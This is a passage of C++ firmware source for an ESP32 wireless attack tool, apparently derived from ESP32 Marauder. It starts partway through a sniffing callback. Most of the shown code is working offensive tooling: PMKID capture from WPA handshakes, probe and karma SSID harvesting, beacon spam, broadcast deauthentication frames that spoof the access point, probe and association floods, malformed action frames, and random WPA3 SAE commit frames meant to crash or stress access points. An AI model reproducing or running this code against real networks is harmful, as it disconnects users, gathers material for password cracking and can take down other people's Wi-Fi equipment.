                            PMKIDEntry &e = pmkids[pmkidCount];
                            memcpy(e.pmkid, &keyData[i+6], 16);
                            memcpy(e.mac_ap,  apMac,  6);
                            memcpy(e.mac_sta, staMac, 6);
                            e.ssid[0] = '\0';
                            // try to look up SSID from our targets list
                            for (int t = 0; t < targetCount; t++) {
                                if (memcmp(targets[t].bssid, apMac, 6) == 0) {
                                    strncpy(e.ssid, targets[t].ssid, 32);
                                    e.ssid[32] = '\0';
                                    break;
                                }
                            }
                            pmkidCount++;
                        }
                        return;
                    }
                    if (keyData[i+1] == 0) break;
                    i += 2 + keyData[i+1];
                }
            }
            return;
        }

        if (frameType != 0) return;   // Only management frames below

        const uint8_t* srcMac = &payload[10];
        const uint8_t* bssid  = &payload[16];
        const uint8_t* tagged = &payload[24];
        int taggedLen = len - 24;

        // ---- Beacon (subtype 8) — pwnagotchi detect ----
        if (frameSubtype == 8 && taggedLen >= 14) {
            // Skip fixed beacon body: timestamp(8) interval(2) capability(2) = 12 bytes
            const uint8_t *tags = tagged + 12;
            int tagsLen = taggedLen - 12;
            // Walk tags
            char ssid[33] = {0};
            bool pwnVendor = false;
            for (int i = 0; i + 2 <= tagsLen; ) {
                uint8_t tag = tags[i];
                uint8_t tlen = tags[i+1];
                if (i + 2 + tlen > tagsLen) break;
                if (tag == 0 && tlen <= 32) {
                    memcpy(ssid, &tags[i+2], tlen);
                    ssid[tlen] = '\0';
                } else if (tag == 0xDD && tlen >= 4) {
                    // Vendor specific — check for DE AD BE EF (pwnagotchi)
                    if (tags[i+2] == 0xDE && tags[i+3] == 0xAD &&
                        tags[i+4] == 0xBE && tags[i+5] == 0xEF) {
                        pwnVendor = true;
                    }
                }
                i += 2 + tlen;
            }
            bool pwnSsid = (strncmp(ssid, "PWNGRID", 7) == 0) ||
                           (strncmp(ssid, "pwn:", 4) == 0);
            if (pwnVendor || pwnSsid) {
                pwnagotchiCount++;
                strncpy(pwnagotchiLastSSID, ssid, 32);
                pwnagotchiLastSSID[32] = '\0';
                // ring-buffer the detection
                int pi = pwnWriteIdx % PWN_BUF_SIZE;
                strncpy(pwnList[pi].ssid, ssid, 32);
                pwnList[pi].ssid[32] = '\0';
                memcpy(pwnList[pi].bssid, &payload[16], 6);
                pwnList[pi].rssi = pkt->rx_ctrl.rssi;
                pwnList[pi].channel = curChan;
                pwnList[pi].millis_seen = (uint32_t)millis();
                pwnWriteIdx++;
            }
            return;
        }

        if (frameSubtype != 4) return;  // Not probe request

        char ssid[33] = {0};
        if (taggedLen >= 2 && tagged[0] == 0) {
            uint8_t ssidLen = tagged[1];
            if (ssidLen > 0 && ssidLen <= 32 && ssidLen + 2 <= taggedLen) {
                memcpy(ssid, &tagged[2], ssidLen);
                ssid[ssidLen] = '\0';
            } else if (ssidLen == 0) {
                ssid[0] = '*'; ssid[1] = '\0';
            }
        }

        int idx = probeWriteIdx % PROBE_BUF_SIZE;
        memcpy(probes[idx].mac, srcMac, 6);
        memcpy(probes[idx].ssid, ssid, sizeof(probes[idx].ssid));
        probes[idx].rssi = pkt->rx_ctrl.rssi;
        probeWriteIdx++;
        probeCount++;
        (void)bssid;

        // ---- Karma capture: stash unique non-wildcard SSIDs ----
        if (karmaListening && ssid[0] != '\0' && ssid[0] != '*') {
            bool found = false;
            for (int i = 0; i < karmaCount; i++) {
                if (strcmp(karmaList[i].ssid, ssid) == 0) {
                    karmaList[i].lastSeen = (uint32_t)millis();
                    found = true;
                    break;
                }
            }
            if (!found && karmaCount < KARMA_MAX) {
                strncpy(karmaList[karmaCount].ssid, ssid, 32);
                karmaList[karmaCount].ssid[32] = '\0';
                karmaList[karmaCount].lastSeen = (uint32_t)millis();
                karmaCount++;
            }
        }
    }

    static bool macIsBroadcast(const uint8_t *m) {
        return m[0] == 0xFF && m[1] == 0xFF && m[2] == 0xFF &&
               m[3] == 0xFF && m[4] == 0xFF && m[5] == 0xFF;
    }
    static bool macIsZero(const uint8_t *m) {
        return (m[0]|m[1]|m[2]|m[3]|m[4]|m[5]) == 0;
    }

    // ---- Random MAC address ----
    static void randomMAC(uint8_t* mac)
    {
        for (int i = 0; i < 6; i++)
            mac[i] = random(256);
        mac[0] &= 0xFE;  // Unicast
        mac[0] |= 0x02;  // Locally administered
    }

    // ---- Send one beacon frame ----
    static void sendBeacon(const char* ssid)
    {
        uint8_t ch = random(1, 12);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        // Random source MAC + BSSID
        randomMAC(&beaconPacket[10]);
        memcpy(&beaconPacket[16], &beaconPacket[10], 6);

        // SSID tag
        int ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        beaconPacket[37] = ssidLen;
        memcpy(&beaconPacket[38], ssid, ssidLen);

        // Post-SSID: Supported Rates (tag 1) + DS Parameter Set (tag 3)
        uint8_t postSSID[13] = {
            0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
            0x03, 0x01, ch
        };
        memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

        int totalLen = 38 + ssidLen + sizeof(postSSID);

        // Send 3 copies (matches Marauder behavior)
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);
        esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, totalLen, false);

        beaconCount += 3;
    }

    // ---- Send deauth frame pair (AP→broadcast + broadcast→AP) ----
    static void sendDeauthPair(const uint8_t* bssid, uint8_t channel)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        // Frame 1: pretend to be AP, deauth all clients
        memset(&deauthFrame[4], 0xFF, 6);      // DA = broadcast
        memcpy(&deauthFrame[10], bssid, 6);     // SA = AP
        memcpy(&deauthFrame[16], bssid, 6);     // BSSID = AP

        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);

        // Frame 2: pretend to be client, deauth from AP
        memcpy(&deauthFrame[4], bssid, 6);      // DA = AP
        randomMAC(&deauthFrame[10]);             // SA = random client
        memcpy(&deauthFrame[16], bssid, 6);     // BSSID = AP

        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);

        deauthCount += 4;
    }

    // ---- Send 802.11 probe request frame ----
    // Subtype 4 (probe-req), broadcast DA/BSSID, random SA.
    static void sendProbeRequest(const char* ssid)
    {
        uint8_t ch = random(1, 12);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        uint8_t frame[128];
        memset(frame, 0, sizeof(frame));
        // FC: probe request (type 0, subtype 4) = 0x40
        frame[0] = 0x40;
        frame[1] = 0x00;
        frame[2] = 0x00; frame[3] = 0x00;  // duration
        memset(&frame[4], 0xFF, 6);        // DA = broadcast
        randomMAC(&frame[10]);              // SA = random
        memset(&frame[16], 0xFF, 6);        // BSSID = broadcast
        frame[22] = 0x00; frame[23] = 0x00; // seq

        int off = 24;
        // SSID tag
        int ssidLen = ssid ? strlen(ssid) : 0;
        if (ssidLen > 32) ssidLen = 32;
        frame[off++] = 0x00; frame[off++] = ssidLen;
        memcpy(&frame[off], ssid, ssidLen);
        off += ssidLen;
        // Supported rates
        const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
        memcpy(&frame[off], rates, sizeof(rates)); off += sizeof(rates);
        // Ext rates
        const uint8_t exrates[] = {0x32, 0x04, 0x0c, 0x12, 0x18, 0x60};
        memcpy(&frame[off], exrates, sizeof(exrates)); off += sizeof(exrates);

        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
        probeFloodCount += 2;
    }

    // ---- Send 802.11 association request to a target AP ----
    static void sendAssocRequest(const uint8_t *bssid, uint8_t channel, const char *ssid)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        uint8_t frame[128];
        memset(frame, 0, sizeof(frame));
        // FC: assoc request (type 0, subtype 0) = 0x00
        frame[0] = 0x00;
        frame[1] = 0x00;
        frame[2] = 0x3A; frame[3] = 0x01;  // duration
        memcpy(&frame[4], bssid, 6);        // DA = AP
        randomMAC(&frame[10]);               // SA = fake client
        memcpy(&frame[16], bssid, 6);        // BSSID
        frame[22] = 0x00; frame[23] = 0x00;
        // Capability info
        frame[24] = 0x11; frame[25] = 0x00;
        // Listen interval
        frame[26] = 0x0A; frame[27] = 0x00;
        int off = 28;
        // SSID tag
        int ssidLen = ssid ? strlen(ssid) : 0;
        if (ssidLen > 32) ssidLen = 32;
        frame[off++] = 0x00; frame[off++] = ssidLen;
        memcpy(&frame[off], ssid, ssidLen); off += ssidLen;
        // Supported rates
        const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
        memcpy(&frame[off], rates, sizeof(rates)); off += sizeof(rates);
        // Ext rates
        const uint8_t exrates[] = {0x32, 0x04, 0x0c, 0x12, 0x18, 0x60};
        memcpy(&frame[off], exrates, sizeof(exrates)); off += sizeof(exrates);

        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }

    // ---- Send 802.11 null-data with power-mgmt bit set ----
    static void sendNullData(const uint8_t *bssid, uint8_t channel, bool pwrSleep)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        uint8_t frame[24];
        memset(frame, 0, sizeof(frame));
        // FC: null data (type 2, subtype 4) = 0x48
        frame[0] = 0x48;
        // Power Mgmt bit is in second byte (FC[12])
        frame[1] = (pwrSleep ? 0x11 : 0x01);  // To DS=1, PwrMgmt=1
        frame[2] = 0x00; frame[3] = 0x00;
        memcpy(&frame[4], bssid, 6);        // BSSID (RA)
        randomMAC(&frame[10]);               // SA (fake client)
        memcpy(&frame[16], bssid, 6);        // DA (AP)
        frame[22] = 0x00; frame[23] = 0x00;

        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    }

    // ---- Send malformed Action frame (bad msg) ----
    // Action category 127 (vendor-specific) with intentionally bogus tail.
    static void sendBadAction(const uint8_t *bssid, uint8_t channel)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        uint8_t frame[80];
        memset(frame, 0, sizeof(frame));
        // FC: action (type 0, subtype 13) = 0xD0
        frame[0] = 0xD0;
        frame[1] = 0x00;
        frame[2] = 0x3A; frame[3] = 0x01;
        memcpy(&frame[4], bssid, 6);        // DA = AP
        randomMAC(&frame[10]);               // SA = random
        memcpy(&frame[16], bssid, 6);        // BSSID
        frame[22] = 0x00; frame[23] = 0x00;
        // Action body
        frame[24] = 0x7F;   // Category: vendor specific
        frame[25] = 0xFF;   // Bogus action code
        // Garbage payload to trip parsers
        for (int i = 26; i < 80; i++) frame[i] = (uint8_t)random(256);

        esp_wifi_80211_tx(WIFI_IF_AP, frame, 80, false);
    }

    // ---- Send WPA3 SAE Commit (Authentication frame) ----
    // Auth Algo = 3 (SAE), seq = 1 (commit), Group ID = 19 (ECC NIST P-256).
    // We use a dummy scalar + element (random bytes) — the AP will (a) accept
    // and respond, (b) drop it as bad, or (c) crash/leak (the point of stress).
    static void sendSaeCommit(const uint8_t *bssid, uint8_t channel)
    {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        uint8_t frame[128];
        memset(frame, 0, sizeof(frame));
        // FC: auth (type 0, subtype 11) = 0xB0
        frame[0] = 0xB0;
        frame[1] = 0x00;
        frame[2] = 0x3A; frame[3] = 0x01;
        memcpy(&frame[4], bssid, 6);
        randomMAC(&frame[10]);
        memcpy(&frame[16], bssid, 6);
        frame[22] = 0x00; frame[23] = 0x00;
        // Fixed params: Auth Algo (2), Seq (2), Status (2)
        frame[24] = 0x03; frame[25] = 0x00;    // SAE
        frame[26] = 0x01; frame[27] = 0x00;    // Commit (seq 1)
        frame[28] = 0x00; frame[29] = 0x00;    // Status = success
        // SAE Commit body: Group ID (2) + scalar (32) + element (64)
        frame[30] = 0x13; frame[31] = 0x00;    // Group 19
        int off = 32;
        for (int i = 0; i < 32 + 64; i++) frame[off++] = (uint8_t)random(256);

        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }
};

// ================================================================
// Static member definitions
// ================================================================
bool WiFiMarauder::active = false;
bool WiFiMarauder::sniffing = false;
bool WiFiMarauder::flooding = false;
bool WiFiMarauder::deauthing = false;
bool WiFiMarauder::stationScanning = false;
bool WiFiMarauder::capturePMKID = false;
bool WiFiMarauder::analyzerRunning = false;
bool WiFiMarauder::macTracking = false;
bool WiFiMarauder::probeFlooding = false;
bool WiFiMarauder::rawSniffing = false;
bool WiFiMarauder::karmaListening = false;
bool WiFiMarauder::assocSleeping = false;
bool WiFiMarauder::badMsgRunning = false;
bool WiFiMarauder::saeRunning = false;
bool WiFiMarauder::saeFlood = false;
int WiFiMarauder::beaconMode = 0;
int WiFiMarauder::deauthTargetIdx = -1;
unsigned long WiFiMarauder::lastChannelHop = 0;
int WiFiMarauder::stationScanIdx = 0;
unsigned long WiFiMarauder::stationScanStart = 0;
uint8_t WiFiMarauder::analyzerChan = 1;
unsigned long WiFiMarauder::analyzerStart = 0;
uint8_t WiFiMarauder::sniffChannel = 1;

WiFiMarauder::StationEntry WiFiMarauder::stations[WiFiMarauder::MAX_STATIONS] = {};
int WiFiMarauder::stationCount = 0;
uint8_t WiFiMarauder::targetAPs[WiFiMarauder::MAX_TARGET_SET][6] = {};
int WiFiMarauder::targetAPCount = 0;
uint8_t WiFiMarauder::targetStations[WiFiMarauder::MAX_TARGET_SET][6] = {};
int WiFiMarauder::targetStationCount = 0;

WiFiMarauder::PMKIDEntry WiFiMarauder::pmkids[WiFiMarauder::MAX_PMKIDS] = {};
volatile int WiFiMarauder::pmkidCount = 0;
volatile int WiFiMarauder::eapolCount = 0;

volatile uint32_t WiFiMarauder::chanPktCount[15] = {0};
volatile int WiFiMarauder::pwnagotchiCount = 0;
char WiFiMarauder::pwnagotchiLastSSID[33] = {0};
WiFiMarauder::PwnEntry WiFiMarauder::pwnList[WiFiMarauder::PWN_BUF_SIZE] = {};
volatile int WiFiMarauder::pwnWriteIdx = 0;

int8_t WiFiMarauder::mactrackRSSI[WiFiMarauder::MACTRACK_HIST] = {};
volatile int WiFiMarauder::mactrackWriteIdx = 0;
uint8_t WiFiMarauder::mactrackTargetMac[6] = {};
volatile uint8_t WiFiMarauder::mactrackLastChan = 0;
volatile uint32_t WiFiMarauder::mactrackLastSeen = 0;
volatile int WiFiMarauder::mactrackHits = 0;

volatile int WiFiMarauder::probeFloodCount = 0;

WiFiMarauder::RawFrame WiFiMarauder::rawFrames[WiFiMarauder::RAW_BUF_SIZE] = {};
volatile int WiFiMarauder::rawWriteIdx = 0;
volatile int WiFiMarauder::rawSeen = 0;

WiFiMarauder::KarmaSSID WiFiMarauder::karmaList[WiFiMarauder::KARMA_MAX] = {};
volatile int WiFiMarauder::karmaCount = 0;
volatile int WiFiMarauder::karmaBeaconCount = 0;

volatile int WiFiMarauder::assocSleepCount = 0;
int WiFiMarauder::assocSleepTargetIdx = -1;
volatile int WiFiMarauder::badMsgCount = 0;
int WiFiMarauder::badMsgTargetIdx = -1;
volatile int WiFiMarauder::saeCount = 0;
int WiFiMarauder::saeTargetIdx = -1;

volatile int WiFiMarauder::pktMgmt = 0;
volatile int WiFiMarauder::pktData = 0;
volatile int WiFiMarauder::pktMisc = 0;
volatile int WiFiMarauder::probeCount = 0;
volatile int WiFiMarauder::beaconCount = 0;
volatile int WiFiMarauder::deauthCount = 0;

WiFiMarauder::ProbeEntry WiFiMarauder::probes[WiFiMarauder::PROBE_BUF_SIZE] = {};
volatile int WiFiMarauder::probeWriteIdx = 0;
int WiFiMarauder::probeReadIdx = 0;

WiFiMarauder::APTarget WiFiMarauder::targets[WiFiMarauder::MAX_TARGETS] = {};
int WiFiMarauder::targetCount = 0;

constexpr char WiFiMarauder::alfa[];

// 802.11 beacon frame template
// FC=0x80 (beacon), Duration=0, DA=broadcast, SA/BSSID=randomized
// Timestamp + Interval(100ms) + Capability(ESS+short preamble)
// SSID tag starts at offset 36 (tag=0x00, length at [37], data at [38+])
uint8_t WiFiMarauder::beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,                         // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,              // DA: broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,              // SA: randomized
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,              // BSSID: = SA
    0xC0, 0x6C,                                       // Seq Control
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,                                       // Beacon interval (100 TU)
    0x01, 0x04,                                       // Capability info
    0x00                                              // SSID tag number
};

// 802.11 deauth frame template
// FC=0xC0 (deauth), reason=0x0002 (prev auth no longer valid)
uint8_t WiFiMarauder::deauthFrame[26] = {
    0xC0, 0x00,                                       // Frame Control (deauth)
    0x3A, 0x01,                                       // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,               // DA (target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,               // SA (source)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,               // BSSID
    0xF0, 0xFF,                                       // Seq Control
    0x02, 0x00                                        // Reason code
};

// SSID lists (from ESP32 Marauder)
const char* const WiFiMarauder::rick_roll[] = {
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you"
};

const char* const WiFiMarauder::funny_names[] = {
    "Abraham Linksys",
    "Benjamin FrankLAN",
    "Dora the Internet Explorer",
    "FBI Surveillance Van 4",
    "Get Off My LAN",
    "Loading...",
    "Martin Router King",
    "404 Wi-Fi Unavailable",
    "Test Wi-Fi Please Ignore",
    "This LAN is My LAN",
    "Titanic Syncing",
    "Winternet is Coming"
};

#endif
